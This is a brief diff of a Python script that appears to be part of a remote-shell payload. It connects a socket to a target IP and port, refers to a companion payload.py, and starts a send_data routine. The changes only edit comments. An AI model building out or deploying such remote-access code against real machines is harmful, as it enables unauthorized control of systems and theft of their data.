@@ -3,7 +3,7 @@ import subprocess
 import os
 
 IP = '' # Add the IP of the target machine
-PORT = '' # Add port *same value lies in payload.py
+PORT = '' # Add port 
 PREFIX = 'utf-8'# 'ISO-8859-7'
 WIN_PREFIX = 'utf-8'#"windows-1252"
 
@@ -11,7 +11,6 @@ payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 payload.connect((IP, PORT))
 print("Connected")
 
-#
 def send_data(output_data):
 	size_of_data = len(output_data)
 	size_of_data = str(size_of_data)
